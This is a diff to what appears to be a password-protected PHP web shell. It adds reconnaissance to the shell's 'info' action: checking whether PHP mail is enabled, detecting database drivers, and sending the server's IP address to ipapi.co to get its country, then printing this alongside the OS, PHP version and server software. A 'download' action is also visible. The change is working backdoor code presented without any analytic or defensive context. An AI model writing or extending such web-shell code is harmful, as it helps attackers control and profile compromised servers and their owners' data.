@@ -50,17 +50,46 @@ if($password === $get_password)
     if($aksi == "info")
     {
         header('Content-Type: text/plain');
+        
         $os = php_uname();
         $ip = getHostByName(getHostName());
         $ver = phpversion();
         $web = $_SERVER['HTTP_HOST'];
         $sof = $_SERVER['SERVER_SOFTWARE'];
+        $mail = (function_exists('mail')) ? "ON" : "OFF";
+        $county_name = file_get_contents("https://ipapi.co/".$ip."/country_name");
+        
+        if(function_exists('mysql_get_client_info'))
+        {
+            $db = "MySql (".mysql_get_client_info().")";
+        }
+        elseif(function_exists('mssql_connect'))
+        {
+	        $db = "MSSQL";
+        }
+        elseif(function_exists('oci_connect'))
+        {
+	        $db = "Oracle";
+        }
+        elseif(function_exists('pg_connect'))
+        {
+	        $db = "PostgreSQL";
+        }
+        else
+        {
+	        $db = "None";
+        }
+
 
         echo "\n";
         echo "PHP Version\t\t: ". $ver . "\n"; 
-        echo "IP Server\t\t: ". $ip . "\n";
-        echo "Operating system\t: ". $os . "\n";
+        echo "IP Server\t\t: ". $ip . " ( ".$county_name." ) \n";
+        echo "Database\t\t: ".$db."\n";
+        echo "Mailer\t\t\t: ".$mail."\n";
         echo "Software\t\t: ". $sof . "\n";
+        echo "Operating system\t: ". $os . "\n";
+       
+        
 
     }
     else if($aksi == "download")
